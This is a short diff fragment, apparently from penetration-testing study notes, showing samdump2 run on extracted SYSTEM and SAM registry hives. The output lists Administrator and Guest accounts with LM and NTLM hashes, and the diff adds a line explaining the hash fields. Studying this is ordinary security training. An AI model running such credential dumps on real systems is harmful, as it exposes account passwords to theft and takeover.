@@ -102,3 +102,5 @@ Question: are we already a local admin
 root@kali:~/Downloads# samdump2 r-system.hive r-sam.hive 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+*** Hash structure, username : something : LM hash : NTLM hash
